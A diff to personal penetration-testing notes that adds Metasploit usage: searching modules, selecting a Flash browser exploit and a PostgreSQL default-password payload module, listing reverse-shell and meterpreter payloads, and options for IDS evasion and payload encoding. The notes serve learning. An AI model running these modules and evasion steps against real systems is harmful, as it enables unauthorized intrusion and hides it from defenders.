@@ -33,6 +33,13 @@ Step -  How to know about the technologies used by the target website and other 
         - 'netcraft' website is used to know about the technology used by the website and also it's subsites, u can get the
           information about the organization of that website and its hosting info.
 
+Metasploit framework ->
+
+exploit/module/auxillary -> use to exploit the vulnerability
+payload -> we can use reverse shell or meterpreter to give access to target
+
+cd /usr/share/metasploit-framework // all msf modules lies here
+
 Step - 
     cmd -> service postgresql start // required to start the service before msfconsole
     cmd -> msfconsole
@@ -40,6 +47,7 @@ Step -
       the path mentioned in exploit with 'use'
       > search platform:linux // to search for particular OS
       > search type:tcp  // to search for exploit with word tcp in it
+      > search type:exploit platform:windows keyword_to_search(Ex->flash)
       > search excel // For Microsoft excel vulnerabilities
       > help // to get list of cmds
       > help search // for more search options
@@ -50,10 +58,12 @@ Step -
       > db_connect -y /usr/share/metasploit-framework/config/database.yml
       > db_export , db_loot etc // look into then using like "db_export -h"
       > use gather/search_email_collector // to start working in search_email_collector auxillary(module)
+      > use exploit/windows/browser/adobe_flash_avm2 //
       > show options // it will list the inputs needed to execute this module
       > show targets // for the particular exploits to know on what type they will work
-      > show payloads 
+      > show payloads // to list the payloads compatible with exploit which could be used 
       > show advanced
+      > show info // to give u info about the exploit
       > show evasion // for IDS explore to evade
       > show encoders // for making payload less likely detected
       > set DOMAIN hackthissite.org // to input value in DOMAIN variable
@@ -91,7 +101,7 @@ Step -
       // meterprter is a payload which once is on the target gives the shell for remote system, it exists on the memory of the
       target system so it gives lot of stealth option as well
       
-      Scenria in which we know that the default password is selected for the target in postgresql DB
+      Scenario in which we know that the default password is selected for the target in postgresql DB
       - workspace
       - search postgres
       - use exploit/linux/postgres/postgres_payload
@@ -133,7 +143,7 @@ Step -
 			   > exploit
 			   > ifconfig
 			   > exit
-			   > back
+			   > back // to get out of auxillary
 			   > creds // it should also be get populated now
 			   > search portscan 
 			   > use auxillary/scanner/portscan/tcp
